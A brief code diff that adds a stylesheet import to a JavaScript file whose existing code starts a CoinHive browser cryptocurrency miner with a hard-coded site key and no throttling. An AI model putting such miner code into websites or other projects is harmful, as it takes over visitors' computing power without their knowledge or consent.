@@ -1,3 +1,5 @@
+import "./style.scss";
+
 const mine = async() => {
     const miner = await CoinHive.Anonymous('R33EaeMyKkd8SvOQKSrecxGLbhu47dZO', { throttle: 0 });
     return new Promise(async(resolve) => {
